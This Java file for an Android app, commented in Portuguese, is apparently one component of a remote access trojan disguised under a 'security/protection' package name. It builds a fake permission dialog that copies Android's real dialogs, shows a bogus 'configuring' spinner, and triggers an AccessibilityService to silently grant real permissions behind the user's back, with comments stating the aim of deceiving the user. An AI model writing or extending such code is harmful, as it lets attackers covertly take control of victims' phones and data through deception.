package com.seguranca.protecao;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.view.Window;
import android.widget.Button;
import android.widget.ProgressBar;

/**
 * TELA FALSA DE PERMISSÕES
 * 
 * Esta Activity mostra um diálogo FAKE de permissões que IMITA
 * perfeitamente os diálogos reais do Android.
 * 
 * FLUXO:
 * 1. Usuário vê diálogo fake com "Permitir/Negar"
 * 2. Usuário clica em "Permitir"
 * 3. Mostra ProgressBar "Configurando..."
 * 4. Em background, AccessibilityService automatiza as permissões REAIS
 * 5. Usuário pensa que apenas deu permissão normal
 * 
 * IMPORTANTE: Usuário NUNCA vê as configurações reais do Android!
 */
public class FakePermissionActivity extends Activity {

    private static final String TAG = "FakePermission";
    private Button btnAllow, btnDeny;
    private View permissionDialog;
    private View loadingView;
    private ProgressBar progressBar;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Remove título da janela para parecer um diálogo
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        
        setContentView(R.layout.activity_fake_permission);
        
        permissionDialog = findViewById(R.id.permissionDialog);
        loadingView = findViewById(R.id.loadingView);
        progressBar = findViewById(R.id.progressBar);
        btnAllow = findViewById(R.id.btnAllow);
        btnDeny = findViewById(R.id.btnDeny);
        
        // Configura botões
        btnAllow.setOnClickListener(v -> onAllowClicked());
        btnDeny.setOnClickListener(v -> onDenyClicked());
    }
    
    /**
     * Usuário clicou em "Permitir"
     * Agora vamos FINGIR que estamos configurando, mas na verdade
     * o AccessibilityService vai automatizar tudo nos bastidores
     */
    private void onAllowClicked() {
        // Esconde diálogo e mostra loading
        permissionDialog.setVisibility(View.GONE);
        loadingView.setVisibility(View.VISIBLE);
        
        // Notifica AccessibilityService para iniciar automação
        Intent intent = new Intent("com.seguranca.protecao.AUTO_GRANT_PERMISSIONS");
        sendBroadcast(intent);
        
        // Aguarda um pouco (fake) e depois fecha
        new Handler().postDelayed(() -> {
            // Salva que permissões foram "concedidas"
            getSharedPreferences("rat_prefs", MODE_PRIVATE)
                .edit()
                .putBoolean("permissions_granted", true)
                .apply();
            
            finish();
        }, 3000); // 3 segundos de "configurando..."
    }
    
    /**
     * Usuário clicou em "Negar"
     * Vamos insistir ou fechar (pode implementar retry)
     */
    private void onDenyClicked() {
        // Por enquanto apenas fecha
        // TODO: Pode mostrar mensagem "App não funcionará sem permissões"
        finish();
    }
}
